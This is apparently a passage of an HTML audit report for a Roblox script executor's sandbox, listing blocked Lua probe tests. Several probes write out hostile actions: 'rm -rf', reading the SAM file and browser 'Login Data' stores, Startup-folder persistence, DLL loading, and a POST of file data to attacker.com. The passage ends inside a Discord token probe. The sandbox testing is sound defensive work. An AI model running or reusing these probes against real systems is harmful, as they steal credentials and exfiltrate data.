+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:OpenBrowserWindow()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p21',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p21'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:OpenBrowserWindow()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):OpenBrowserWindow()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:OpenNativeOverlay()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p22',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p22'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:OpenNativeOverlay()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):OpenNativeOverlay()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:ReturnToJavaScript()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p23',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p23'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:ReturnToJavaScript()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):ReturnToJavaScript()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>BrowserService:SendCommand()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p24',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p24'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "BrowserService:SendCommand()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("BrowserService"):SendCommand()
+        end)
+        assert(errorMsg, "BrowserService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:Call()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p25',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p25'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:Call()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Call()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetLast()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p26',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p26'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetLast()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetLast()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetMessageId()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p27',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p27'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetMessageId()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetMessageId()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetProtocolMethodRequestMessageId()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p28',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p28'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetProtocolMethodRequestMessageId()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetProtocolMethodRequestMessageId()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:GetProtocolMethodResponseMessageId()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p29',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p29'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:GetProtocolMethodResponseMessageId()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):GetProtocolMethodResponseMessageId()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:MakeRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p30',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p30'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:MakeRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):MakeRequest()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:Publish()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p31',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p31'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:Publish()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Publish()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:PublishProtocolMethodRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p32',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p32'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:PublishProtocolMethodRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):PublishProtocolMethodRequest()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:PublishProtocolMethodResponse()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p33',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p33'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:PublishProtocolMethodResponse()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):PublishProtocolMethodResponse()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:Subscribe()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p34',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p34'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:Subscribe()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):Subscribe()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:SubscribeToProtocolMethodRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p35',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p35'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:SubscribeToProtocolMethodRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):SubscribeToProtocolMethodRequest()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>MessageBusService:SubscribeToProtocolMethodResponse()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p36',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p36'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "MessageBusService:SubscribeToProtocolMethodResponse()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("MessageBusService"):SubscribeToProtocolMethodResponse()
+        end)
+        assert(errorMsg, "MessageBusService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>OpenCloudService:HttpRequestAsync()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p37',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p37'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "OpenCloudService:HttpRequestAsync()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("OpenCloudService"):HttpRequestAsync()
+        end)
+        assert(errorMsg, "OpenCloudService vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>ScriptContext:AddCoreScriptLocal()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p38',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p38'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "ScriptContext:AddCoreScriptLocal()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("ScriptContext"):AddCoreScriptLocal()
+        end)
+        assert(errorMsg, "ScriptContext vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DataModel:Load()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p39',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p39'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DataModel:Load()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("DataModel"):Load()
+        end)
+        assert(errorMsg, "DataModel vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DataModel:OpenScreenshotsFolder()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p40',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p40'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DataModel:OpenScreenshotsFolder()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("DataModel"):OpenScreenshotsFolder()
+        end)
+        assert(errorMsg, "DataModel vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DataModel:OpenVideosFolder()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p41',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p41'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DataModel:OpenVideosFolder()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("DataModel"):OpenVideosFolder()
+        end)
+        assert(errorMsg, "DataModel vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>OmniRecommendationsService:MakeRequest()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p42',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p42'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "OmniRecommendationsService:MakeRequest()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("OmniRecommendationsService"):MakeRequest()
+        end)
+        assert(errorMsg, "OmniRecommendations vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Players:ReportAbuse()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p43',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p43'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Players:ReportAbuse()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("Players"):ReportAbuse()
+        end)
+        assert(errorMsg, "Players service vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Players:ReportAbuseV3()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p44',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p44'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Players:ReportAbuseV3()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("Players"):ReportAbuseV3()
+        end)
+        assert(errorMsg, "Players service vulnerability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>CoreGui:TakeScreenshot()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p45',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p45'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "CoreGui:TakeScreenshot()",
+    callback = function()
+        local success, errorMsg = pcall(function()
+            game:GetService("CoreGui"):TakeScreenshot()
+        end)
+        assert(errorMsg, "Screenshot capability")
+    end
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>os.execute()</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p49',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p49'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "os.execute()",
+    callback = function()
+        local success, errorMsg = pcall(function() os.execute("rm -rf") end)
+        assert(errorMsg, "OS command execution")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System32 Access Attempt</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p52',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p52'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "System32 Access Attempt",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile("C:\\Windows\\System32\\config\\SAM")
+        end)
+        assert(err, "System file access vulnerability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>User Directory Enumeration</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p53',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p53'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "User Directory Enumeration",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local f = listfiles("C:\\Users")
+            for _,v in ipairs(f) do print(v) end
+        end)
+        assert(err, "Unrestricted user directory access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Program Files Write Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p54',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p54'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Program Files Write Access",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile("C:\\Program Files\\malicious.exe","test")
+        end)
+        assert(err, "Program Files write vulnerability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Startup Folder Persistence</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p55',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p55'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Startup Folder Persistence",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local p = os.getenv("APPDATA")
+                .. "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe"
+            writefile(p,"persistence_test")
+        end)
+        assert(err, "Startup persistence vulnerability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Browser Data Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p56',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p56'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Browser Data Access",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("LOCALAPPDATA").."\\Google\\Chrome\\User Data\\Default\\Login Data")
+            readfile(os.getenv("LOCALAPPDATA").."\\Microsoft\\Edge\\User Data\\Default\\Login Data")
+        end)
+        assert(err, "Browser credential access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System: OS/IO Library RCE</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p58',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p58'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "System: OS/IO Library RCE",
+    callback = function()
+        local dangerous = {}
+        pcall(function() if io.popen    then dangerous["io.popen"]    = io.popen    end end)
+        pcall(function() if os.execute  then dangerous["os.execute"]  = os.execute  end end)
+        pcall(function() if os.remove   then dangerous["os.remove"]   = os.remove   end end)
+        pcall(function() if os.rename   then dangerous["os.rename"]   = os.rename   end end)
+        if next(dangerous) then error("CRITICAL: Dangerous OS/IO functions present!") end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>File System: UNC Path Bypass</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p59',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p59'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "File System: UNC Path Bypass",
+    callback = function()
+        if not writefile then return "writefile not supported" end
+        local p = "\\\\127.0.0.1\\C$\\vuln_test.txt"
+        local ok = pcall(function() writefile(p,"test") end)
+        if ok then pcall(delfile,p); error("Filesystem sandbox escaped via UNC Path") end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System: Console Spam/Freeze</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>WARNING: Allowed setting massive console title</td><td><button class='vbtn vbtn-pass' onclick="toggle('p61',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p61'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: WARNING: Allowed setting massive console title
+
+-- Probe source that was blocked:
+{
+    name = "System: Console Spam/Freeze",
+    callback = function()
+        if not rconsoleprint then return "rconsole not supported" end
+        if rconsolename then
+            local ok = pcall(function() rconsolename(string.rep("A",10000)) end)
+            if ok then return "WARNING: Allowed setting massive console title" end
+        end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>System: FFI Exposure</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p62',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p62'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "System: FFI Exposure",
+    callback = function()
+        local has_ffi = false
+        pcall(function() if ffi then has_ffi = true end end)
+        pcall(function()
+            if package and package.loaded and package.loaded.ffi then has_ffi = true end
+        end)
+        if has_ffi then error("CRITICAL: FFI Library is exposed!") end
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Process Injection Attempt</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p66',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p66'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Process Injection Attempt",
+    callback = function()
+        local _, err = pcall(function()
+            local h = io.popen("tasklist")
+            if h then h:read("*a"); h:close() end
+        end)
+        assert(err, "Process enumeration capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>DLL Injection Test</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p67',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p67'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "DLL Injection Test",
+    callback = function()
+        if not loadstring then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local ffi = require("ffi")
+            ffi.cdef("void* LoadLibraryA(const char* lpFileName);")
+            ffi.C.LoadLibraryA("malicious.dll")
+        end)
+        assert(err, "DLL loading capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Data Exfiltration Test</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p68',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p68'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Data Exfiltration Test",
+    callback = function()
+        if not readfile or not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            local data = readfile("workspace/sensitive.txt")
+            request({ Url="http://attacker.com/steal", Method="POST", Body=data })
+        end)
+        assert(err, "File exfiltration capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Environment Variable Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p69',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p69'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Environment Variable Access",
+    callback = function()
+        local _, err = pcall(function()
+            local _ = os.getenv("USERNAME")
+            local _ = os.getenv("COMPUTERNAME")
+            local _ = os.getenv("USERPROFILE")
+            local _ = os.getenv("TEMP")
+        end)
+        assert(err, "Environment variable access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Hidden File Creation</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p75',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p75'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Hidden File Creation",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile("hidden.exe","backdoor")
+            if os.execute then os.execute("attrib +h +s hidden.exe") end
+        end)
+        assert(err, "Hidden file capability")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Chrome Password Theft</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p77',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p77'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Chrome Password Theft",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("LOCALAPPDATA").."\\Google\\Chrome\\User Data\\Default\\Login Data")
+        end)
+        assert(err, "Browser password database accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Discord Token Extraction</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p78',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p78'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Discord Token Extraction",
+    callback = function()
